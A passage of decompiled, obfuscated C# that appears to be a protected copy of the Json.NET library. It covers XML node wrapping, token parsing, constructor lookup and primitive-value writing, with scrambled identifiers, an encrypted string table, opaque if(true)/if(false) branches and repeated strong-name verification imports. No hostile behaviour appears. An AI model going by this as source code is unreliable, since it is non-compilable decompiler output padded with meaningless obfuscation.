                    if ((nullable2.GetValueOrDefault() == *(int*) ((IntPtr) voidPtr + 4) ? (nullable2.HasValue ? 1 : 0) : 0) != 0)
                      throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(6244), ex, obj2);
                  }
                  nullable1 = new int?(obj10.\u0001);
                }
                else
                  throw;
              }
label_21:;
            }
            while (*(sbyte*) ((IntPtr) voidPtr + 8) == (sbyte) 0);
          }
          if (*(sbyte*) ((IntPtr) voidPtr + 8) == (sbyte) 0)
            \u0014.\u0006.\u0001(obj6, obj0, (\u0016.\u0007) obj3, \u0014.\u0006.\u0082(6386), obj2);
          \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, obj6);
          return obj6;
        default:
          \u0014.\u0006.\u0001(obj2, obj0, obj6, obj5);
          goto case null;
      }
    }

    static IXmlNode \u0001([In] XObject obj0)
    {
      while (!(obj0 is XDocument))
      {
        if (true)
        {
          if (true)
            goto label_12;
label_3:
          switch (obj0)
          {
            case XProcessingInstruction _:
              return (IXmlNode) new \u0001.\u000E((XProcessingInstruction) obj0);
            case XText _:
              if (true)
                return (IXmlNode) new \u0004.\u0012((XText) obj0);
              goto label_13;
            case XComment _:
              return (IXmlNode) new \u0019((XComment) obj0);
            case XAttribute _:
              return (IXmlNode) new XAttributeWrapper((XAttribute) obj0);
            case XDocumentType _:
              return (IXmlNode) new \u0010.\u0010((XDocumentType) obj0);
            default:
              return (IXmlNode) new \u0018(obj0);
          }
label_12:
          if (!(obj0 is XElement))
          {
            if (obj0 is XContainer)
              return (IXmlNode) new \u0017((XContainer) obj0);
            goto label_3;
          }
label_13:
          return (IXmlNode) new XElementWrapper((XElement) obj0);
        }
      }
      return (IXmlNode) new \u000F.\u000E((XDocument) obj0);
    }

    static void \u0001(
      [In] XmlNodeConverter obj0,
      [In] \u0012.\u0007 obj1,
      [In] \u0011.\u000E obj2,
      [In] XmlNamespaceManager obj3,
      [In] string obj4,
      [In] IXmlNode obj5)
    {
      if (!\u0007\u0002.\u008C\u0004(obj4, \u0014.\u0006.\u0082(17883)))
      {
label_2:
        int num;
        for (int index1 = \u0007\u0002.\u008C\u0004(obj4, \u0014.\u0006.\u0082(17892)) ? 1 : 0; index1 == 0; index1 = num)
        {
          if (!\u0007\u0002.\u008C\u0004(obj4, \u0014.\u0006.\u0082(17913)))
          {
            if (\u0007\u0002.\u008C\u0004(obj4, \u0014.\u0006.\u0082(17930)))
            {
              obj5.\u0001(obj2.\u0005(global::\u0001.\u007E\u0001(obj1.\u0001())));
              return;
            }
            for (int index2 = global::\u0007.\u009E(obj4) ? 1 : 0; index2 == 0; index2 = num)
            {
              num = (int) \u001B\u0002.\u007E\u0088\u0005((object) obj4, 0);
              if (false)
                goto label_2;
              else if (true)
              {
                if (num == 63)
                {
                  \u0014.\u0006.\u0001(obj1, obj5, obj0, obj4, obj2);
                  return;
                }
                break;
              }
            }
            if (\u008E\u0002.\u0007\u0006(obj4, \u0014.\u0006.\u0082(17963), StringComparison.OrdinalIgnoreCase))
            {
              \u0014.\u0006.\u0001(obj2, obj5, obj1, obj0);
              return;
            }
            if (obj1.\u0001() == JsonToken.StartArray)
            {
              \u0014.\u0006.\u0001(obj1, obj5, obj4, obj2, obj0, obj3);
              return;
            }
            \u0014.\u0006.\u0001(obj0, obj1, obj2, obj5, obj4, obj3);
            return;
          }
          obj5.\u0001(obj2.\u0004(global::\u0001.\u007E\u0001(obj1.\u0001())));
          return;
        }
        obj5.\u0001(obj2.\u0003(global::\u0001.\u007E\u0001(obj1.\u0001())));
      }
      else
        obj5.\u0001(obj2.\u0002(global::\u0001.\u007E\u0001(obj1.\u0001())));
    }

    static JsonToken? \u0001([In] \u000E.\u000E obj0, [In] \u0004.\u0011 obj1)
    {
      if (true)
        goto label_11;
label_4:
      return new JsonToken?(JsonToken.EndObject);
label_11:
      JTokenType jtokenType = ((\u0015.\u0013) obj1).\u0001();
      int num1;
      do
      {
        int num2 = (int) (jtokenType - 1);
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_4;
            case 1:
              num1 = 14;
              if (num1 == 0)
              {
                num2 = num1;
                continue;
              }
              goto label_13;
            case 2:
              goto label_6;
            case 3:
              goto label_9;
            default:
              if (false)
                goto case 1;
              else
                goto label_10;
          }
        }
label_6:;
      }
      while (false);
      if (true)
        return new JsonToken?(JsonToken.EndConstructor);
label_9:
      return new JsonToken?();
label_10:
      throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(3429), (object) ((\u0015.\u0013) obj1).\u0001(), \u0014.\u0006.\u0082(17976));
label_13:
      return new JsonToken?((JsonToken) num1);
    }

    static \u0015.\u0007 \u0001([In] System.Type obj0)
    {
      System.Type[] typeArray = \u008F\u0002.\u007E\u000E\u0006((object) obj0);
      System.Type type1 = ((IList<System.Type>) typeArray)[0];
      System.Type type2 = ((IList<System.Type>) typeArray)[1];
      return \u0014.\u0006.\u0001(obj0, (MethodBase) \u0012\u0002.\u007E\u0093\u0004((object) obj0, new System.Type[2]
      {
        type1,
        type2
      }), new string[2]
      {
        \u0014.\u0006.\u0082(13586),
        \u0014.\u0006.\u0082(13591)
      });
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static int \u0001([In] JsonWriter obj0)
    {
      if (false)
        goto label_8;
      else
        goto label_5;
label_3:
      int num1;
      int num2;
      if (true)
      {
        num2 = num1;
        if (true)
          return num2;
        goto label_7;
      }
      else
        goto label_8;
label_5:
      if (obj0.\u0001 == null)
        num2 = 0;
      else if (true)
        num2 = obj0.\u0001.Count;
      else
        goto label_8;
label_7:
      num1 = num2;
      if (obj0.\u0001.\u0001 == JsonContainerType.None)
        goto label_3;
label_8:
      ++num1;
      goto label_3;
    }

    static void \u0001([In] int obj0, [In] \u0004.\u0011 obj1, [In] object obj2, [In] bool obj3)
    {
      if (\u0014.\u0006.\u0001(obj2, obj1))
      {
        \u001D\u0002 obj4 = \u001D\u0002.\u007E\u008A\u0005;
        IEnumerable enumerable = (IEnumerable) obj2;
        int num = obj0;
        IEnumerator enumerator = obj4((object) enumerable);
        try
        {
          while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
          {
            object obj5 = \u0084\u0002.\u007E\u0095\u0005((object) enumerator);
            \u0014.\u0006.\u0001(num, obj1, obj5, obj3);
            ++num;
          }
        }
        finally
        {
          if (!(enumerator is IDisposable disposable))
            goto label_8;
label_7:
          global::\u0011.\u007E\u0007\u0002((object) disposable);
label_8:
          if (false)
            goto label_7;
        }
      }
      else
      {
        \u0015.\u0013 obj;
        do
        {
          obj = \u0014.\u0006.\u0001(obj2);
        }
        while (false);
        obj1.\u0001(obj0, obj, obj3);
      }
    }

    static Decimal \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17207), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u008A\u0002.\u0001\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static ConstructorInfo \u0001([In] DefaultContractResolver obj0_1, [In] System.Type obj1)
    {
      // ISSUE: type reference
      IList<ConstructorInfo> list = (IList<ConstructorInfo>) ((IEnumerable<ConstructorInfo>) \u0019\u0004.\u007E\u0011\u0008((object) obj1, BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic)).Where<ConstructorInfo>((Func<ConstructorInfo, bool>) (obj0_2 => \u0096\u0004.\u007E\u008F\u0008((object) obj0_2, \u0004\u0002.\u0084\u0004(__typeref (\u000E.\u0003)), true))).ToList<ConstructorInfo>();
      int num = list.Count;
      if (true)
        num = num <= 1 ? list.Count : throw new JsonException(\u0014.\u0006.\u0082(18013));
      if (num == 1)
        return list[0];
      // ISSUE: type reference
      if ((object) obj1 != (object) \u0004\u0002.\u0084\u0004(__typeref (Version)))
        return (ConstructorInfo) null;
      // ISSUE: type reference
      // ISSUE: type reference
      // ISSUE: type reference
      // ISSUE: type reference
      return \u0012\u0002.\u007E\u0093\u0004((object) obj1, new System.Type[4]
      {
        \u0004\u0002.\u0084\u0004(__typeref (int)),
        \u0004\u0002.\u0084\u0004(__typeref (int)),
        \u0004\u0002.\u0084\u0004(__typeref (int)),
        \u0004\u0002.\u0084\u0004(__typeref (int))
      });
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] \u0013.\u000F.\u0002 obj0) => obj0.\u0001 == obj0.\u0002;

    static void \u0001([In] long obj0, [In] \u0005.\u0004 obj1)
    {
      do
      {
        if (true)
          goto label_7;
label_5:
        \u009B.\u007E\u0010\u0004((object) obj1.\u0001, '-');
label_6:
        ulong num1;
        \u0014.\u0006.\u0001(obj1, num1);
        continue;
label_7:
        if (obj0 >= 0L && obj0 <= 9L)
        {
          \u009B.\u007E\u0010\u0004((object) obj1.\u0001, (char) (48L + obj0));
          break;
        }
        long num2 = obj0;
        int num3 = 0;
        if (num3 == 0 && num3 == 0)
        {
          long num4 = (long) num3;
          num1 = num2 >= num4 ? (ulong) obj0 : (ulong) -obj0;
          long num5 = obj0;
          num3 = 0;
          num2 = num5;
        }
        long num6 = (long) num3;
        if (num2 >= num6)
          goto label_6;
        else
          goto label_5;
      }
      while (false);
    }

    static unsafe \u0011.\u0007 \u0001(
      char[] _param0,
      int _param1,
      int _param2,
      out int _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(25);
      _param3 = 0;
      if (_param2 == 0)
        return \u0011.\u0007.\u0004;
      *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) (_param0[_param1] == '-');
      if (*(sbyte*) ((IntPtr) voidPtr + 24) != (sbyte) 0)
        goto label_29;
label_3:
      *(int*) voidPtr = _param1 + _param2;
      if (_param2 > 10 || _param2 == 10 && (int) _param0[_param1] - 48 > 2)
      {
        *(int*) ((IntPtr) voidPtr + 4) = _param1;
        while (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
        {
          *(int*) ((IntPtr) voidPtr + 8) = (int) _param0[*(int*) ((IntPtr) voidPtr + 4)] - 48;
          if (*(int*) ((IntPtr) voidPtr + 8) < 0 || *(int*) ((IntPtr) voidPtr + 8) > 9)
            return \u0011.\u0007.\u0004;
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        return \u0011.\u0007.\u0003;
      }
      *(int*) ((IntPtr) voidPtr + 12) = _param1;
      while (*(int*) ((IntPtr) voidPtr + 12) < *(int*) voidPtr)
      {
        *(int*) ((IntPtr) voidPtr + 16) = (int) _param0[*(int*) ((IntPtr) voidPtr + 12)] - 48;
        if (*(int*) ((IntPtr) voidPtr + 16) < 0 || *(int*) ((IntPtr) voidPtr + 16) > 9)
          return \u0011.\u0007.\u0004;
        *(int*) ((IntPtr) voidPtr + 20) = 10 * _param3 - *(int*) ((IntPtr) voidPtr + 16);
        if (*(int*) ((IntPtr) voidPtr + 20) > _param3)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          goto label_18;
        }
        else
        {
          _param3 = *(int*) ((IntPtr) voidPtr + 20);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        }
      }
      goto label_22;
label_15:
      *(int*) ((IntPtr) voidPtr + 16) = (int) _param0[*(int*) ((IntPtr) voidPtr + 12)] - 48;
      if (*(int*) ((IntPtr) voidPtr + 16) < 0 || *(int*) ((IntPtr) voidPtr + 16) > 9)
        return \u0011.\u0007.\u0004;
      *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
label_18:
      if (*(int*) ((IntPtr) voidPtr + 12) >= *(int*) voidPtr)
        return \u0011.\u0007.\u0003;
      goto label_15;
label_22:
      if (true)
      {
        if (*(sbyte*) ((IntPtr) voidPtr + 24) == (sbyte) 0)
        {
          if (_param3 == int.MinValue)
            return \u0011.\u0007.\u0003;
          _param3 = -_param3;
        }
        return \u0011.\u0007.\u0002;
      }
      goto label_15;
label_29:
      if (_param2 == 1)
        return \u0011.\u0007.\u0004;
      _param1++;
      --_param2;
      goto label_3;
    }

    static void \u0001([In] \u0010.\u0006 obj0, [In] JsonWriter obj1, [In] object obj2, [In] \u0012.\u0014 obj3)
    {
      \u0010.\u0006 obj4 = obj0;
      JsonWriter jsonWriter = obj1;
      \u0012.\u0014 obj5 = obj3;
      object obj6 = obj2;
      if (true)
        \u0014.\u0006.\u0001(obj4, jsonWriter, (\u0016.\u0007) obj5, obj6);
      string str;
      \u0014.\u0006.\u0001(obj2, obj3.\u0002(), out str);
      obj1.\u0004(str);
      if (false)
        return;
      \u0014.\u0006.\u0001(obj1, obj0, obj2, (\u0016.\u0007) obj3);
    }

    static char? \u0001([In] \u0015.\u0013 obj0)
    {
      char? nullable;
      if (obj0 == null)
        nullable = new char?();
      else
        goto label_13;
label_12:
      return nullable;
label_13:
      \u0006.\u0005 obj1 = \u0014.\u0006.\u0001(obj0);
      if (obj1 != null)
      {
        int num1 = 1;
        int num2;
        while (true)
        {
          JTokenType[] jtokenTypeArray = \u0015.\u0013.\u0007;
          \u0006.\u0005 obj2 = obj1;
          if (\u0014.\u0006.\u0001(num1 != 0, jtokenTypeArray, (\u0015.\u0013) obj2))
          {
            if (true)
            {
              if (obj1.\u0001 != null)
              {
                num2 = (int) Convert.ToChar(obj1.\u0001, (IFormatProvider) CultureInfo.InvariantCulture);
                if (false)
                  num1 = num2;
                else
                  goto label_11;
              }
              else
                break;
            }
            else
              goto label_12;
          }
          else
            goto label_5;
        }
        if (true)
          return new char?();
        goto label_12;
label_11:
        return new char?((char) num2);
      }
label_5:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18090), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static \u0005.\u0005 \u0001([In] object obj0)
    {
      \u0015.\u0005 obj = JsonTypeReflector.\u0001<\u0015.\u0005>(obj0);
      Func<object[], \u0005.\u0005> func;
      do
      {
        if (true)
        {
          if (obj != null)
          {
            if (true)
            {
              if (true)
                func = JsonTypeReflector.\u0001.\u0001(obj.\u0001);
              else
                goto label_6;
            }
            else
              continue;
          }
          else
            goto label_6;
        }
        if (func == null)
          goto label_6;
      }
      while (false);
      goto label_9;
label_6:
      return (\u0005.\u0005) null;
label_9:
      return func(obj.\u0001());
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] JsonWriter obj0, [In] \u0010.\u0006 obj1, [In] int obj2)
    {
      do
      {
        do
        {
          \u0014.\u0006.\u0001((\u0016.\u0008) obj1);
        }
        while (false);
        if (\u0014.\u0006.\u0001(obj0) == \u0016.\u0004.\u0006)
        {
          obj0.\u0008();
          if (false)
            goto label_3;
        }
        else
          break;
      }
      while (false);
      goto label_7;
label_3:
      return;
label_7:
      while (\u0014.\u0006.\u0001(obj0) > obj2)
        obj0.\u0012();
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
      if (obj0.\u0001() != JsonToken.PropertyName)
        goto label_14;
      else
        goto label_13;
label_1:
      goto label_14;
label_13:
      int num1 = obj0.\u0001() ? 1 : 0;
      goto label_1;
label_14:
      num1 = \u0014.\u0006.\u0001(obj0.\u0001()) ? 1 : 0;
      int num2;
      if (true)
      {
        if (num1 == 0)
          return;
        num2 = obj0.\u0001();
      }
      else
        goto label_8;
label_6:
      int num3 = num2;
label_7:
      num1 = obj0.\u0001() ? 1 : 0;
label_8:
      if (true)
      {
        if (num1 == 0)
          return;
        if (true)
        {
          num2 = num3;
          if (true)
          {
            int num4 = obj0.\u0001();
            if (num2 < num4)
              goto label_7;
          }
          else
            goto label_6;
        }
        else
          goto label_7;
      }
      else
        goto label_1;
    }

    static Predicate<object> \u0001([In] DefaultContractResolver obj0, [In] MemberInfo obj1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      DefaultContractResolver.\u0005 obj = new DefaultContractResolver.\u0005();
      MethodInfo method;
      do
      {
        method = obj1.DeclaringType.GetMethod(\u0014.\u0006.\u0082(18131) + obj1.Name, ReflectionUtils.\u0001);
      }
      while (false);
      if ((object) method == null || (object) method.ReturnType != (object) typeof (bool))
        return (Predicate<object>) null;
      // ISSUE: reference to a compiler-generated field
      obj.\u0001 = \u0014.\u0006.\u0001().\u0001<object>((MethodBase) method);
      // ISSUE: reference to a compiler-generated method
      return new Predicate<object>(obj.\u0001);
    }

    static int \u0001([In] \u0013.\u000F.\u0003 obj0) => 32768 - obj0.\u0002;

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (!\u0014.\u0006.\u0001(obj0, 1, true))
      {
        obj0.\u0002 = obj0.\u0001;
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0);
      }
      if (obj0.\u0001[obj0.\u0002 + 1] == 'u')
      {
        \u0014.\u0006.\u0001(obj0);
      }
      else
      {
        obj0.\u0002 += 2;
        throw \u0014.\u0006.\u0001(obj0, obj0.\u0001[obj0.\u0002 - 1]);
      }
    }

    static double \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(14883), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u008B\u0002.\u0002\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] Array obj2,
      [In] \u0001.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] int obj5,
      [In] int[] obj6)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      *(int*) voidPtr = obj6.Length;
      int[] numArray = new int[*(int*) voidPtr + 1];
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      while (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
          goto label_24;
        else
          goto label_4;
label_2:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        continue;
label_4:
        obj1.\u0003();
        *(int*) ((IntPtr) voidPtr + 8) = \u0010\u0003.\u007E\u0092\u0006((object) obj2, *(int*) voidPtr);
        while (*(int*) ((IntPtr) voidPtr + 8) <= \u0010\u0003.\u007E\u0093\u0006((object) obj2, *(int*) voidPtr))
        {
          numArray[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 8);
          if (numArray.Length == \u001F.\u007E\u0017\u0003((object) obj2))
          {
            object obj7 = \u001A\u0004.\u007E\u0012\u0008((object) obj2, numArray);
            try
            {
              \u0016.\u0007 obj8 = ((\u0006.\u0002) obj3).\u0002 ?? \u0014.\u0006.\u0001(obj7, obj0);
              int num2;
              for (int index = \u0014.\u0006.\u0001(obj7, obj8, (JsonProperty) null, obj4, (\u0006.\u0002) obj3, obj0) ? 1 : 0; index == 0; index = num2)
              {
                num2 = \u0014.\u0006.\u0001(obj0, obj1, obj7, (JsonProperty) null, obj8, (\u0006.\u0002) obj3, obj4) ? 1 : 0;
                if (true)
                {
                  if (num2 == 0)
                    goto label_19;
                  else
                    goto label_13;
                }
              }
              if (true)
              {
                \u0014.\u0006.\u0001(obj7, obj1, obj0);
                goto label_19;
              }
label_13:
              \u0014.\u0006.\u0001(obj0, obj1, obj7, obj8, (JsonProperty) null, (\u0006.\u0002) obj3, obj4);
            }
            catch (Exception ex)
            {
              if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1), (object) obj2, (object) *(int*) ((IntPtr) voidPtr + 8), ex, (\u000F.\u0001) null, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
                \u0014.\u0006.\u0001(obj1, obj0, obj5 + 1);
              else
                throw;
            }
          }
          else
            \u0014.\u0006.\u0001(obj0, obj1, obj2, obj3, obj4, obj5 + 1, numArray);
label_19:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        }
        obj1.\u000F();
        if (false)
          goto label_2;
        else
          break;
label_24:
        numArray[*(int*) ((IntPtr) voidPtr + 4)] = obj6[*(int*) ((IntPtr) voidPtr + 4)];
        goto label_2;
      }
    }

    static bool \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001() && \u0014.\u0006.\u0001(obj0);

    static void \u0001([In] JsonToken obj0, [In] object obj1, [In] \u0008.\u0010 obj2) => \u0014.\u0006.\u0001(obj0, new \u0006.\u0005(obj1), obj2);

    static JsonWriterException \u0001([In] Exception obj0, [In] string obj1, [In] string obj2)
    {
      obj2 = \u0011.\u0002.\u0001((\u000F.\u0001) null, obj1, obj2);
      return new JsonWriterException(obj2, obj0, obj1);
    }

    static JsonWriterException \u0001(
      [In] JsonWriter obj0,
      [In] string obj1,
      [In] Exception obj2)
    {
      return \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0001(obj0), obj1);
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      do
      {
        if (obj0.\u0001 == null)
        {
          if (true)
          {
            obj0.\u0001 = \u0014.\u0006.\u0001(obj0.\u0001, 1024);
            if (true)
              obj0.\u0001[0] = char.MinValue;
          }
        }
      }
      while (false);
    }

    static byte \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13988), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u009E\u0003.\u0092\u0007(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static bool \u0001([In] \u0003.\u0006 obj0)
    {
label_0:
      while (!obj0.\u0002())
      {
        do
        {
          if (true)
          {
            if (obj0.\u0003 != null)
              goto label_3;
          }
          else
            goto label_0;
        }
        while (false);
        return obj0.\u0001 != null;
      }
label_3:
      return true;
    }

    static ArgumentOutOfRangeException \u0001(
      [In] string obj0,
      [In] object obj1,
      [In] string obj2)
    {
      string message;
      do
      {
        message = global::\u0005.\u0099(obj2, global::\u0004.\u0097(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18152), (IFormatProvider) \u0098.\u0002\u0004(), obj1));
      }
      while (false);
      return new ArgumentOutOfRangeException(obj0, message);
    }

    static void \u0001([In] \u0016.\u0011 obj0, [In] string obj1, [In] int obj2)
    {
      if (true)
      {
        if (true)
        {
          switch (obj1)
          {
            case null:
              return;
            default:
              if (obj0.\u0001 == null)
              {
                obj0.\u0001 = new byte[256];
                goto label_13;
              }
              else
                goto label_13;
          }
        }
        else
          goto label_8;
      }
      else
        goto label_5;
label_2:
      if (true)
      {
        int num = \u001B\u0004.\u007E\u0013\u0008((object) \u0016.\u0011.\u0001, obj1, 0, \u001F.\u007E\u0011\u0003((object) obj1), obj0.\u0001, 0);
        \u000E\u0004.\u007E\u009E\u0007((object) obj0.\u0001, obj0.\u0001, 0, obj2);
      }
      else
        goto label_8;
label_5:
      if (true)
        return;
      goto label_2;
label_8:
      byte[] numArray;
      if (true)
      {
        \u0096\u0002.\u007E\u001A\u0006((object) obj0.\u0001, numArray);
        return;
      }
label_13:
      if (obj2 > 256)
      {
        numArray = \u001C\u0004.\u007E\u0014\u0008((object) \u0016.\u0011.\u0001, obj1);
        goto label_8;
      }
      else
        goto label_2;
    }

    static ConstructorInfo \u0001([In] System.Type obj0_1, [In] bool obj1)
    {
      BindingFlags bindingFlags = BindingFlags.Instance | BindingFlags.Public;
      if (obj1)
        goto label_2;
label_1:
      return ((IEnumerable<ConstructorInfo>) \u0019\u0004.\u007E\u0011\u0008((object) obj0_1, bindingFlags)).SingleOrDefault<ConstructorInfo>((Func<ConstructorInfo, bool>) (obj0_2 => !((IEnumerable<ParameterInfo>) \u0008\u0002.\u007E\u008D\u0004((object) obj0_2)).Any<ParameterInfo>()));
label_2:
      bindingFlags |= BindingFlags.NonPublic;
      goto label_1;
    }

    static void \u0001([In] JsonWriter obj0, [In] \u000F.\u0003 obj1, [In] object obj2)
    {
      switch (obj1)
      {
        case \u000F.\u0003.\u0003:
          obj0.\u0001((char) obj2);
          break;
        case \u000F.\u0003.\u0004:
          obj0.\u0001(obj2 == null ? new char?() : new char?((char) obj2));
          break;
        case \u000F.\u0003.\u0005:
          obj0.\u0001((bool) obj2);
          break;
        case \u000F.\u0003.\u0006:
          obj0.\u0001(obj2 == null ? new bool?() : new bool?((bool) obj2));
          break;
        case \u000F.\u0003.\u0007:
          obj0.\u0001((sbyte) obj2);
          break;
        case \u000F.\u0003.\u0008:
          obj0.\u0001(obj2 == null ? new sbyte?() : new sbyte?((sbyte) obj2));
          break;
        case \u000F.\u0003.\u000E:
          obj0.\u0001((short) obj2);
          break;
        case \u000F.\u0003.\u000F:
          obj0.\u0001(obj2 == null ? new short?() : new short?((short) obj2));
          break;
        case \u000F.\u0003.\u0010:
          obj0.\u0001((ushort) obj2);
          break;
        case \u000F.\u0003.\u0011:
          obj0.\u0001(obj2 == null ? new ushort?() : new ushort?((ushort) obj2));
          break;
        case \u000F.\u0003.\u0012:
          obj0.\u0001((int) obj2);
          break;
        case \u000F.\u0003.\u0013:
          obj0.\u0001(obj2 == null ? new int?() : new int?((int) obj2));
          break;
        case \u000F.\u0003.\u0014:
          obj0.\u0001((byte) obj2);
          break;
        case \u000F.\u0003.\u0015:
          obj0.\u0001(obj2 == null ? new byte?() : new byte?((byte) obj2));
          break;
        case \u000F.\u0003.\u0016:
          obj0.\u0001((uint) obj2);
          break;
        case \u000F.\u0003.\u0017:
          obj0.\u0001(obj2 == null ? new uint?() : new uint?((uint) obj2));
          break;
        case \u000F.\u0003.\u0018:
          obj0.\u0001((long) obj2);
          break;
        case \u000F.\u0003.\u0019:
          obj0.\u0001(obj2 == null ? new long?() : new long?((long) obj2));
          break;
        case \u000F.\u0003.\u001A:
          obj0.\u0001((ulong) obj2);
          break;
        case \u000F.\u0003.\u001B:
          obj0.\u0001(obj2 == null ? new ulong?() : new ulong?((ulong) obj2));
          break;
        case \u000F.\u0003.\u001C:
          obj0.\u0001((float) obj2);
          break;
        case \u000F.\u0003.\u001D:
          obj0.\u0001(obj2 == null ? new float?() : new float?((float) obj2));
          break;
        case \u000F.\u0003.\u001E:
          obj0.\u0001((double) obj2);
          break;
        case \u000F.\u0003.\u001F:
          obj0.\u0001(obj2 == null ? new double?() : new double?((double) obj2));
          break;
        case \u000F.\u0003.\u007F:
          obj0.\u0001((DateTime) obj2);
          break;
        case \u000F.\u0003.\u0080:
          obj0.\u0001(obj2 == null ? new DateTime?() : new DateTime?((DateTime) obj2));
          break;
        case \u000F.\u0003.\u0081:
          obj0.\u0001((DateTimeOffset) obj2);
          break;
        case \u000F.\u0003.\u0082:
          obj0.\u0001(obj2 == null ? new DateTimeOffset?() : new DateTimeOffset?((DateTimeOffset) obj2));
          break;
        case \u000F.\u0003.\u0083:
          if (false)
            break;
          obj0.\u0001((Decimal) obj2);
          break;
        case \u000F.\u0003.\u0084:
          obj0.\u0001(obj2 == null ? new Decimal?() : new Decimal?((Decimal) obj2));
          break;
        case \u000F.\u0003.\u0086:
          obj0.\u0001((Guid) obj2);
          break;
        case \u000F.\u0003.\u0087:
          obj0.\u0001(obj2 == null ? new Guid?() : new Guid?((Guid) obj2));
          break;
        case \u000F.\u0003.\u0088:
          obj0.\u0001((TimeSpan) obj2);
          break;
        case \u000F.\u0003.\u0089:
          obj0.\u0001(obj2 == null ? new TimeSpan?() : new TimeSpan?((TimeSpan) obj2));
          break;
        case \u000F.\u0003.\u008C:
          obj0.\u0001((Uri) obj2);
          break;
        case \u000F.\u0003.\u008D:
          obj0.\u0004((string) obj2);
          break;
        case \u000F.\u0003.\u008E:
          obj0.\u0001((byte[]) obj2);
          break;
        case \u000F.\u0003.\u008F:
          obj0.\u0008();
          break;
        default:
